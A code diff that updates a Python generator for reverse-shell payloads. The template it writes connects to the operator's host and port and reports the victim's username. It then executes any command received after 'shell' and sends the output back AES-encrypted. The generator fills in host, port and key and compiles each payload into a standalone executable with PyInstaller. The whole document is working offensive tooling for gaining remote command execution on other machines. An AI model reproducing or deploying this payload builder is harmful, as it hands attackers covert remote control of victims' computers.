@@ -1,60 +1,64 @@
 import sys
 import socket
+import os
 
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.connect(("8.8.8.8", 80))
 ip = s.getsockname()[0]
+
 string = """
-import os, subprocess, socket
-import ssl
+from Crypto.Cipher import AES
+import subprocess, socket
+import base64
+import os
+
+BLOCK_SIZE = 32
+PADDING = '0'
+pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
+EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
+DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
+secret = "{enc_key}"
+iv = os.urandom(16)
+cipher = AES.new(secret, AES.MODE_CFB, iv)
+HOST = "{host}"
+PORT = {port}
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print("Trying to Connect ... !!!")
+s.connect((HOST, PORT))
+print("Connection EstaBlished")
+user_priv = os.popen("whoami").read().strip()
+s.send(user_priv.encode())
 
 
-def connect():
-    try:
-        global host
-        global port
-        global s
-        global sock
-
-        host = "{host}"
-        port = {port}
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        # s = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1)
-        print("Trying to Connect")
-        s.connect((host, port))
-        print("Connection Established")
-        s.send(os.popen("whoami").read())
-    except socket.error as msg:
-        print("socket error : " + str(msg[0]))
-
-
-def receive():
-    receive2 = s.recv(1024)
-    if receive2 == 'quit' or receive2 == 'exit':
-        s.close()
-    elif receive2[0:5] == 'shell':
-        proc2 = subprocess.Popen(receive2[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        output = proc2.stdout.read() + proc2.stderr.read()
-        args = output
+while 1:
+    data = s.recv(1024)
+    decrypted = DecodeAES(cipher, data).decode("ISO-8859-1")
+    print (decrypted)
+    
+    if decrypted == "quit":
+        break
+    
+    if decrypted[:5] == "shell":
+        proc = subprocess.Popen(decrypted[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+        stdoutput = proc.stdout.read() + proc.stderr.read()
+        encrypted = EncodeAES(cipher, stdoutput)
+        s.send(encrypted)
     else:
-        args = "Invalid Command"
-    send(args)
+        stdoutput = "Invalid Command"
+        encrypted = EncodeAES(cipher, stdoutput)
+        s.send(encrypted)
 
-
-def send(args):
-    send = s.send(args)
-    receive()
-
-
-connect()
-receive()
+    
 s.close()
 """
 
 
-def gen_payload(id, port):
-    var = {'host': ip, 'port':port}
+def gen_payload(id, port, key):
+    var = {'enc_key': key, 'host': ip, 'port':port}
     file_name = 'static/payloads/listener-%d.py' %id
     f = open(file_name,'w')
     f.write(string.format(**var))
     f.close()
+    os.system("pyinstaller --onefile --distpath static/payloads/ static/payloads/listener-%d.py" % id)
+
